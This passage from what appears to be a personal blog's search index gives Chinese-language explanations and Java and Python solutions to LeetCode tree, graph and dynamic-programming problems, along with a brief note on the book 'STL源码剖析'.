return i; &#125; return -1;&#125; 上面反复使用了Arrays.copyOfRange()，大大增加了时间复杂度和空间复杂度。一个优化的方案是，给定数组的上边界和下边界。 1234567891011121314151617181920212223242526272829303132public TreeNode buildTree(int[] preorder, int[] inorder) &#123; return buildTreeHelper(preorder, 0, preorder.length, inorder, 0, inorder.length);&#125;private TreeNode buildTreeHelper(int [] preorder, int preFrom, int preTo, int [] inorder, int inFrom, int inTo) &#123; if (preTo &lt;= preFrom) return null; // 通过先序遍历找到根节点 int rootVal = preorder[preFrom]; // 在中序遍历中找到根节点并记录index int rootIndex = -1; for (int i = inFrom; i &lt; inTo; i++) &#123; if (inorder[i] == rootVal) &#123; rootIndex = i; break; &#125; &#125; // 左子树大小（节点个数） int leftTreeSize = rootIndex - inFrom; // 建立根节点 TreeNode root = new TreeNode(rootVal); // 建立左子树 root.left = buildTreeHelper(preorder, preFrom + 1, preFrom + 1 + leftTreeSize, inorder, inFrom, rootIndex); //建立右子树 root.right = buildTreeHelper(preorder, preFrom + 1 + leftTreeSize, preTo, inorder, rootIndex + 1, inTo); return root;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"107. Binary Tree Level Order Traversal II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-107-Binary-Tree-Level-Order-Traversal-II/","text":"Given a binary tree, return the bottom-up level order traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root). For example: Given binary tree [3,9,20,null,null,15,7], 12345678 3 / \\ 9 20 / \\ 15 7``` Return its bottom-up level order traversal as: [ [15,7], [9,20], [3]]1234567891011121314151617181920212223242526#### Java这道题目是LeeCode 102. Binary Tree Level Order Traversal的扩展，唯一的区别是这道题目要求从底向上的遍历。所以非常直接的方法就是把LeetCode102的结果反转一下：```Javapublic List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; levels = new ArrayList&lt;List&lt;Integer&gt;&gt;(); if (root == null) return levels; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.offer(root); while (!queue.isEmpty()) &#123; List&lt;Integer&gt; curLevel = new ArrayList&lt;&gt;(); int size = queue.size(); for (int i = 0; i &lt; size; i++) &#123; TreeNode node = queue.poll(); if (node.left != null) queue.offer(node.left); if (node.right != null) queue.offer(node.right); curLevel.add(node.val); &#125; levels.add(curLevel); &#125; Collections.reverse(levels); return levels; &#125; 或者使用链表，每次添加在链表首部 12345678910111213141516171819public List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123; LinkedList&lt;List&lt;Integer&gt;&gt; levels = new LinkedList&lt;List&lt;Integer&gt;&gt;(); if (root == null) return levels; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.offer(root); while (!queue.isEmpty()) &#123; List&lt;Integer&gt; curLevel = new ArrayList&lt;&gt;(); int size = queue.size(); for (int i = 0; i &lt; size; i++) &#123; TreeNode node = queue.poll(); if (node.left != null) queue.offer(node.left); if (node.right != null) queue.offer(node.right); curLevel.add(node.val); &#125; levels.addFirst(curLevel); &#125; return levels;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"108. Convert Sorted Array to Binary Search Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-108-Convert-Sorted-Array-to-Binary-Search-Tree/","text":"Given an array where elements are sorted in ascending order, convert it to a height balanced BST. For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1. Example: 12345678910Given the sorted array: [-10,-3,0,5,9],One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \\ -3 9 / / -10 5 Java利用平衡二叉树的特点： 递归。 每次找到排序数组的中点，中点左边的排序数组构成左子树，中点右边的排序数组构成右子树。 123456789101112public TreeNode sortedArrayToBST(int[] num) &#123; return bst(num, 0, num.length - 1);&#125;public TreeNode bst(int[] num, int low, int high) &#123; if (low &gt; high) return null; int mid = (low + high) &gt;&gt;&gt; 1; TreeNode node = new TreeNode(num[mid]); node.left = bst(num, low, mid - 1); node.right = bst(num, mid + 1, high); return node;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"11. Container With Most Water","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-11-Container-With-Most-Water/","text":"题目Given $n$ non-negative integers $a_1, a_2, …, a_n$, where each represents a point at coordinate $(i, a_i)$. $n$ vertical lines are drawn such that the two endpoints of line $i$ is at $(i, a_i)$ and $(i, 0)$. Find two lines, which together with x-axis forms a container, such that the container contains the most water. Note: You may not slant the container and $n$ is at least 2. 分析贪心算法：容器面积，取决于最短的木板 12345678910111213141516class Solution: def maxArea(self, height): \"\"\" :type height: List[int] :rtype: int \"\"\" left, right = 0, len(height)-1 max_area = 0 while left &lt; right: if min(height[left], height[right])*(right-left) &gt; max_area: max_area = min(height[left], height[right])*(right-left) if height[left] &lt; height[right]: left += 1 else: right -= 1 return max_area 相关题目： Trapping Rain Water Largest Rectangle in Histogram, 参考视频","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Points","slug":"Two-Points","permalink":"http://larryim.cc/tags/Two-Points/"},{"name":"Greedy Algorithm","slug":"Greedy-Algorithm","permalink":"http://larryim.cc/tags/Greedy-Algorithm/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"110. Balanced Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-110-Balanced-Binary-Tree/","text":"Given a binary tree, determine if it is height-balanced. For this problem, a height-balanced binary tree is defined as: a binary tree in which the depth of the two subtrees of every node never differ by more than 1. Example 1: 12345678Given the following tree [3,9,20,null,null,15,7]: 3 / \\ 9 20 / \\ 15 7Return true. Example 2: 12345678910Given the following tree [1,2,2,3,3,null,null,4,4]: 1 / \\ 2 2 / \\ 3 3 / \\ 4 4Return false. Java这道题目的思路也是非常直接的，考察的是树的基本操作。要确定一棵树是不是高度平衡树，只需确定它的左子树和右子树的高度差是大于1。基于这个思路，直接上代码： 123456789101112public boolean isBalanced(TreeNode root) &#123; if (root == null) return true; if (Math.abs(heightOfTree(root.left, 1) - heightOfTree(root.right, 1)) &gt; 1) return false; return isBalanced(root.left) &amp;&amp; isBalanced(root.right);&#125;private int heightOfTree(TreeNode root, int height) &#123; if (root == null) return height; return Math.max(heightOfTree(root.left, height + 1), heightOfTree(root.right, height + 1));&#125; 求二叉树高度的方法heightOfTree有两种方案。第一种是上面的从顶到底计数的方法。还有一种是从底向上计数的方法。 123private int heightOfTree(TreeNode root) &#123; if (root == null) return 0; return Math.max(heightOfTree(root.left), heightOfTree(root.right)) + 1; 仔细观察+1所在的位置，从底到顶计数的方法看起来更简洁，因为它省去了一个参数传递。而且从底向上的方法，可以直接判断高度差是否大于1. 123456789101112public boolean isBalanced(TreeNode root) &#123; return heightOfTree(root) != -1;&#125; private int heightOfTree(TreeNode root) &#123; if (root == null) return 0; int leftHeight = heightOfTree(root.left); if (leftHeight == -1) return -1; int rightHeight = heightOfTree(root.right); if (rightHeight == -1) return -1; if (Math.abs(leftHeight - rightHeight) &gt; 1) return -1; return Math.max(leftHeight, rightHeight) + 1; 上面代码巧妙的利用 -1 实现判断高度差是否大于1。 测试结果表明两种方法的运算速度是相同的。但是实际上两种方法的时间复杂度不同，从底向上计数并判断高度差的方法，由于只遍历了一遍二叉树，所以时间复杂度是$O(n)$. 从顶向下计数的方法在最坏情况下的复杂度是$O(n^2)$.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"111. Minimum Depth of Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-111-Minimum-Depth-of-Binary-Tree/","text":"Given a binary tree, find its minimum depth. The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node. Note: A leaf is a node with no children. Example: 12345678Given binary tree [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7return its minimum depth = 2. JavaDFS版本的递归： 123456public int minDepth(TreeNode root) &#123; if(root == null) return 0; int left = minDepth(root.left); int right = minDepth(root.right); return (left == 0 || right == 0) ? left + right + 1: Math.min(left, right) + 1;&#125; 最关键在于判断左子树和右子树存在的情况，并区别对待。 类似题目: Q104. Maximum Depth of Binary Tree","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breadth-first Search","slug":"Breadth-first-Search","permalink":"http://larryim.cc/tags/Breadth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"112. Path Sum","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-112-Path-Sum/","text":"Given a binary tree and a sum, determine if the tree has a root-to-leaf path such that adding up all the values along the path equals the given sum. Note: A leaf is a node with no children. Example: Given the below binary tree and sum = 22, 1234567 5 / \\ 4 8 / / \\ 11 13 4 / \\ \\7 2 1 return true, as there exist a root-to-leaf path 5-&gt;4-&gt;11-&gt;2 which sum is 22. Java如果是叶子节点，那么路径的和要刚好等于给定的和。如果不是叶子节点，那么递归求解该节点的左右子节点，子节点和相应的减少该节点的值。 123456public boolean hasPathSum(TreeNode root, int sum) &#123; if (root == null) return false; if (root.left == null &amp;&amp; root.right == null) return sum == root.val; //叶子节点 int newSum = sum - root.val; return hasPathSum(root.left, newSum) || hasPathSum(root.right, newSum); &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"114. Flatten Binary Tree to Linked List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-114-Flatten-Binary-Tree-to-Linked-List/","text":"Given a binary tree, flatten it to a linked list in-place. For example, given the following tree: 12345 1 / \\ 2 5 / \\ \\3 4 6 The flattened tree should look like: 12345678910111 \\ 2 \\ 3 \\ 4 \\ 5 \\ 6 Java把二叉树转换成链表，也就是用二叉树的右指针(TreeNode.right)表示链表的next指针(ListNode.next).根据链表的形态，进行的是先序遍历(144. Binary Tree Preorder Traversal)。那么改编一下先序遍历就可以得到所求的链表。 12345678910111213141516171819public void flatten(TreeNode root) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); TreeNode prevNode = null; while (!stack.isEmpty()) &#123; TreeNode cur = stack.pop(); if (cur != null) &#123; stack.push(cur.right); stack.push(cur.left); if (prevNode != null) &#123; prevNode.right = cur; &#125; cur.left = null; prevNode = cur; &#125; &#125; preNode.right = null;&#125; 下面用前序遍历的递归方法，这种方法比前面一种快一些(17ms-&gt;13ms)，但是写的过程中比较容易出错。特别是需要注意要先保存root.left和root.right，因为在递归时会发生改变。 12345678910private TreeNode prevNode ;public void flatten(TreeNode root) &#123; if (root == null) return; if (prevNode != null) prevNode.right = root; TreeNode left = root.left, right = root.right; root.left = null; prevNode = root; flatten(left); flatten(right);&#125; 论坛上有一种非常完美的方案，使用后序遍历的递归方法， 12345678910private TreeNode prev = null;public void flatten(TreeNode root) &#123; if (root == null) return; flatten(root.right); flatten(root.left); root.right = prev; root.left = null; prev = root;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"116. Populating Next Right Pointers in Each Node","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-116-Populating-Next-Right-Pointers-in-Each-Node/","text":"Given a binary tree 12345public class TreeLinkNode &#123; int val; TreeLinkNode left, right, next; TreeLinkNode(int x) &#123; val = x; &#125;&#125; Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL. Initially, all next pointers are set to NULL. Note: You may only use constant extra space. Recursive approach is fine, implicit stack space does not count as extra space for this problem. You may assume that it is a perfect binary tree (ie, all leaves are at the same level, and every parent has two children). Example: Given the following perfect binary tree, 12345 1 / \\ 2 3 / \\ / \\4 5 6 7 After calling your function, the tree should look like: 12345 1 -&gt; NULL / \\ 2 -&gt; 3 -&gt; NULL / \\ / \\4-&gt;5-&gt;6-&gt;7 -&gt; NULL Java这道题目是二叉树层序遍历(102. Binary Tree Level Order Traversal)的变形。在层序遍历的同时，要求每个节点的next指向右边的节点。既然二叉树的层序遍历有递归和迭代两种形式，这里也写上这两种形式。 迭代的形式，变量prev保存前一个遍历的节点， prev.next指向当前节点。 12345678910111213141516171819public void connect(TreeLinkNode root) &#123; if (root == null) return; Queue&lt;TreeLinkNode&gt; queue = new LinkedList&lt;&gt;(); queue.offer(root); TreeLinkNode cur, prev; while(!queue.isEmpty()) &#123; int size = queue.size(); prev = null; for (int i = 0; i &lt; size; i++) &#123; cur = queue.poll(); if (prev != null) prev.next = cur; prev = cur; // push nodes of the next level if (cur.left != null) queue.offer(cur.left); if (cur.right != null) queue.offer(cur.right); &#125; &#125;&#125; 递归的形式，维持一个变量prev为每一层的前一个遍历的节点。 1234567891011121314private List&lt;TreeLinkNode&gt; prev;public void connect(TreeLinkNode root) &#123; prev = new ArrayList&lt;&gt;(); levelOrderTraversal(root, 0);&#125; private void levelOrderTraversal(TreeLinkNode root, int height) &#123; if (root == null) return; if (height &gt;= prev.size()) prev.add(root); else prev.get(height).next = root; prev.set(height, root); levelOrderTraversal(root.left, height + 1); levelOrderTraversal(root.right, height + 1);&#125; 最快度的方案也是最优美的方案利用了题目中的完全二叉树的提示。到目前为止，还没有利用上这一条约束。加上这一条约束以后，其实可以从左到右，从上到下依次直接连接节点： 123456789101112131415161718public void connect(TreeLinkNode root) &#123; if (root == null) return; while (root != null) &#123; TreeLinkNode firstNode = root; while(root != null)&#123; // 左子节点指向右子节点 if(root.left != null) root.left.next = root.right; // 右子节点指向下一个(右边)节点的左节点 if(root.right != null &amp;&amp; root.next != null) root.right.next = root.next.left; // 往右移动 root = root.next; &#125; // 移动到下一层 root = firstNode.left; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"113. Path Sum II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-113-Path-Sum-II/","text":"Given a binary tree and a sum, find all root-to-leaf paths where each path’s sum equals the given sum. Note: A leaf is a node with no children. Example: Given the below binary tree and sum = 22, 1234567 5 / \\ 4 8 / / \\ 11 13 4 / \\ / \\7 2 5 1 Return: 1234[ [5,4,11,2], [5,8,4,5]] Java这道题目是112. Path Sum的加强版。Q112中只需要给出是否存在这样一条路径：路径开始于根节点，终止于叶子节点，并且路径的和为给定值。现在，更进一步，需要给出具体的路径。一种很自然的想法是，改进Q112算法，传递一个List参数，依次保存访问过的节点为路径，最后保存符合要求的路径。 使用Backtracking的思想(DFS)，删除访问过的元素： 1234567891011121314151617private List&lt;List&lt;Integer&gt;&gt; paths = new ArrayList&lt;List&lt;Integer&gt;&gt;();public List&lt;List&lt;Integer&gt;&gt; pathSum(TreeNode root, int sum) &#123; findPathSum(root, sum, new ArrayList&lt;&gt;()); return paths;&#125;private void findPathSum(TreeNode root, int sum, ArrayList&lt;Integer&gt; list)&#123; if (root == null) return; list.add(root.val); if (root.left == null &amp;&amp; root.right == null &amp;&amp; sum == root.val) paths.add(new ArrayList&lt;&gt;(list)); int newSum = sum - root.val; findPathSum(root.right, newSum, list); findPathSum(root.left, newSum, list); list.remove(list.size() - 1);&#125; 为什么只删除一次呢？因为到了叶子结点的时候，它的左子节点和右子节点都是null，所以相当于删除了该叶子节点。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"117. Populating Next Right Pointers in Each Node II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-117-Populating-Next-Right-Pointers-in-Each-Node-II/","text":"Given a binary tree 12345public class TreeLinkNode &#123; int val; TreeLinkNode left, right, next; TreeLinkNode(int x) &#123; val = x; &#125;&#125; Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL. Initially, all next pointers are set to NULL. Note: You may only use constant extra space. Recursive approach is fine, implicit stack space does not count as extra space for this problem. Example: Given the following binary tree, 12345 1 / \\ 2 3 / \\ \\4 5 7 After calling your function, the tree should look like: 12345 1 -&gt; NULL / \\ 2 -&gt; 3 -&gt; NULL / \\ \\4-&gt; 5 -&gt; 7 -&gt; NULL Java这道题目几乎和116. Populating Next Right Pointers in Each Node一摸一样，只是去掉了条件–二叉树是完全二叉树。那么Q116中的解法1，解法2仍旧可以使用。问题是解法3可以使用吗？或者需要怎么样的更改？由于不是完全二叉树，需要增加一些判断，还需要保存每一层的开始位置，仅此而已。 1234567891011121314151617181920212223242526272829public void connect(TreeLinkNode root) &#123; TreeLinkNode next_head = null; //head of the next level TreeLinkNode next_prev = null; //the leading node on the next level TreeLinkNode cur = root; //current node of current level while (cur != null) &#123; // travel on diff levels while (cur != null) &#123; //iterate on the current level //left child if (cur.left != null) &#123; if (next_prev != null) next_prev.next = cur.left; else next_head = cur.left; next_prev = cur.left; &#125; //right child if (cur.right != null) &#123; if (next_prev != null) next_prev.next = cur.right; else next_head = cur.right; next_prev = cur.right; &#125; //move to next node cur = cur.next; &#125; // move to next level cur = next_head; next_head = null; next_prev = null; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"684. Redundant Connection","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-684-Redundant-Connection/","text":"In this problem, a tree is an undirected graph that is connected and has no cycles. The given input is a graph that started as a tree with $N$ nodes (with distinct values 1, 2, …, $N$), with one additional edge added. The added edge has two different vertices chosen from 1 to $N$, and was not an edge that already existed. The resulting graph is given as a 2D-array of edges. Each element of edges is a pair [$u$, $v$] with $u &lt; v$, that represents an undirected edge connecting nodes $u$ and $v$. Return an edge that can be removed so that the resulting graph is a tree of $N$ nodes. If there are multiple answers, return the answer that occurs last in the given 2D-array. The answer edge [$u$, $v$] should be in the same format, with $u &lt; v$. Example 1: 123456Input: [[1,2], [1,3], [2,3]]Output: [2,3]Explanation: The given undirected graph will be like this: 1 / \\2 - 3 Example 2: 123456Input: [[1,2], [2,3], [3,4], [1,4], [1,5]]Output: [1,4]Explanation: The given undirected graph will be like this:5 - 1 - 2 | | 4 - 3 Note: The size of the input 2D-array will be between 3 and 1000. Every integer represented in the 2D-array will be between 1 and $N$, where $N$ is the size of the input array. Java这道题目考查图论的基本操作-检测无向图的是否有环。类似于LeetCode261. Graph Valid Tree，换汤不换药。具体方法是：使用并查集存放连通域，将每一条边的两个节点执行并(union)操作，如果存在环，那么这两个顶点一定已经在同一连通域中，返回这条边；否则不存在环。 1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public int[] findRedundantConnection(int[][] edges) &#123; int n = edges.length; int[] id = new int[n + 1], size = new int[n + 1]; for (int v = 1; v &lt;= n; v++) id[v] = v; int v, w, i, j; for (int[] edge : edges) &#123; v = edge[0]; w = edge[1]; i = find(id, v); j = find(id, w); if (i == j) return new int[]&#123;v, w&#125;; union(id, size, v, w); &#125; return new int[]&#123;-1, -1&#125;; &#125; private void union(int[] id, int[] size, int v, int w) &#123; int i = find(id, v); int j = find(id, w); if (i == j) return; if (size[i] &gt; size[j]) &#123; id[j] = i; size[i] += size[j]; &#125; else &#123; id[i] = j; size[j] += size[i]; &#125; &#125; private int find(int[] id, int i) &#123; while (i != id[i]) &#123; id[i] = id[id[i]]; i = id[i]; &#125; return i; &#125; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Union Find","slug":"Union-Find","permalink":"http://larryim.cc/tags/Union-Find/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"STL源码剖析","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/C-STL源码剖析/","text":"《STL源码剖析》这本书可以作为深入学习C++ STL的伴侣，毕竟并不是所有人都可以流畅地阅读STL源码的。这本书非常详细的剖析了STL源码：它对源码中重要的代码都做了详细的注释，而对于复杂的、难以理解的内容，作者也做了不少图解。 源码学习之前，当然是先看看源码了。在mac上，LLVM附带的C++的STL(Standard Template Library)位于： /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/include/c++/v1/ 另外，STL源码剖析推荐的SGI STL可以在GITHUB下载，其官方网站不再提供下载。","tags":[{"name":"Cpp","slug":"Cpp","permalink":"http://larryim.cc/tags/Cpp/"},{"name":"STL","slug":"STL","permalink":"http://larryim.cc/tags/STL/"}],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"120. Triangle","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-120-Triangle/","text":"Given a triangle, find the minimum path sum from top to bottom. Each step you may move to adjacent numbers on the row below. For example, given the following triangle 123456[ [2], [3,4], [6,5,7], [4,1,8,3]] The minimum path sum from top to bottom is 11 (i.e., 2 + 3 + 5 + 1 = 11). Note: Bonus point if you are able to do this using only $O(n)$ extra space, where $n$ is the total number of rows in the triangle. Java动态规划，关键是寻找最小路径和之间的关系： 123456789101112131415public int minimumTotal(List&lt;List&lt;Integer&gt;&gt; triangle) &#123; if (triangle == null) return 0; int m = triangle.size(); int [][] pathSum = new int[m][m]; // initialize for (int j = 0; j &lt; m; j++) pathSum[m - 1][j] = triangle.get(m - 1).get(j); for (int i = m - 2; i &gt;= 0; i--) for (int j = 0; j &lt;= i; j++) pathSum[i][j] = triangle.get(i).get(j) + Math.min(pathSum[i + 1][j], pathSum[i + 1][j + 1]); return pathSum[0][0];&#125; 题目还提到了能不能把算法优化到$O(n)$的空间复杂度。观察 1pathSum[i][j] = triangle.get(i).get(j) + Math.min(pathSum[i + 1][j], pathSum[i + 1][j + 1]); 等式左边总是第i行，右边总是i+1行，所以更新不重叠，只需要一个一维数组就行了。 123456789101112131415public int minimumTotal(List&lt;List&lt;Integer&gt;&gt; triangle) &#123; if (triangle == null) return 0; int m = triangle.size(); int [] pathSum = new int[m]; // initialize for (int j = 0; j &lt; m; j++) pathSum[j] = triangle.get(m - 1).get(j); for (int i = m - 2; i &gt;= 0; i--) for (int j = 0; j &lt;= i; j++) pathSum[j] = triangle.get(i).get(j) + Math.min(pathSum[j], pathSum[j + 1]); return pathSum[0];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"121. Best Time to Buy and Sell Stock","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-121-Best-Time-to-Buy-and-Sell-Stock/","text":"Say you have an array for which the $i^{th}$ element is the price of a given stock on day $i$. If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit. Note that you cannot sell a stock before you buy one. Example 1: 1234Input: [7,1,5,3,6,4]Output: 5Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5. Not 7-1 = 6, as selling price needs to be larger than buying price. Example 2: 123Input: [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit = 0. Java这道题目考查的是基本的动态规划。可以试着这么想：maxProfits[$i$]代表前$i$天的最大利润，那么怎么知道前$i+1$天的最大利润maxProfits[$i+1$]呢？什么情况下最大利润？就是最低点买入，最高点卖出。既然求前$i+1$天的最大利润，第$i+1$天肯定不能买入，不然没有卖出啊。那么第$i+1$天所做的事情仅有卖出，那么第$i+1$天卖出的股价减去前第$i$天的股票最低点，就有可能是$i+1$天的最大利润。 分析到这里，动态规划的方程非常明显了： maxProfits[i] = max(maxProfits[i - 1], prices[i - 1] - minPrices[i]); 相应的代码： 12345678910public int maxProfit(int[] prices) &#123; int[] maxProfits = new int[prices.length + 1]; int[] minPrices = new int[prices.length + 1]; maxProfits[0] = 0; minPrices[0] = Integer.MAX_VALUE; for (int i = 1; i &lt; maxProfits.length; i++) &#123; minPrices[i] = Math.min(minPrices[i - 1], prices[i - 1]); maxProfits[i] = Math.max(maxProfits[i - 1], prices[i - 1] - minPrices[i]); &#125; return maxProfits[prices.length];&#125; 由于股票价格是一维的，而且最终只需要截止到最后一天的最大利润，中间结果可以不用保存： 123456789public int maxProfit(int[] prices) &#123; int maxProfits = 0; int minPrices = Integer.MAX_VALUE; for (int i = 0; i &lt; prices.length; i++) &#123; if (prices[i] &lt; minPrices) minPrices = prices[i]; if (prices[i] - minPrices &gt; maxProfits) maxProfits = prices[i] - minPrices; &#125; return maxProfits;&#125; 这样的算法时间复杂度是$O(n)$，空间复杂度是$O(1)$。","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"124. Binary Tree Maximum Path Sum","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-124-Binary-Tree-Maximum-Path-Sum/","text":"Given a non-empty binary tree, find the maximum path sum. For this problem, a path is defined as any sequence of nodes from some starting node to any node in the tree along the parent-child connections. The path must contain at least one node and does not need to go through the root. Example 1: 1234567Input: [1,2,3] 1 / \\ 2 3Output: 6 Example 2: 123456789Input: [-10,9,20,null,null,15,7] -10 / \\ 9 20 / \\ 15 7Output: 42 Java这道题目不太容易想到好的解决方法。一种思路是依次求出某节点左子树和右子树的最大路径和，那么以该节点作为根节点的树的最大路径和等于左子树和右子树的最大路径和加上根节点的值。递归求解某颗子树的最大路径和： 一个路径从起点到终点，可以往上走几步，然后再往下走几步。但是一旦往下走，它不能再往上走。每个路径有一个最高的节点，也是该路径上的最近共同祖先(LCA, 参考LeetCode 235. Lowest Common Ancestor of a Binary Search Tree)。 一个递归方法maxPathDown(TreeNode node): 计算最高节点即node的最大路径和，如果需要更新最大值maxValue； 返回可延伸到输入节点(node)的父节点的最大路径和。 1234567891011121314private int maxValue;public int maxPathSum(TreeNode root) &#123; maxValue = Integer.MIN_VALUE; maxPathDown(root); return maxValue;&#125;private int maxPathDown(TreeNode node) &#123; if (node == null) return 0; int left = Math.max(0, 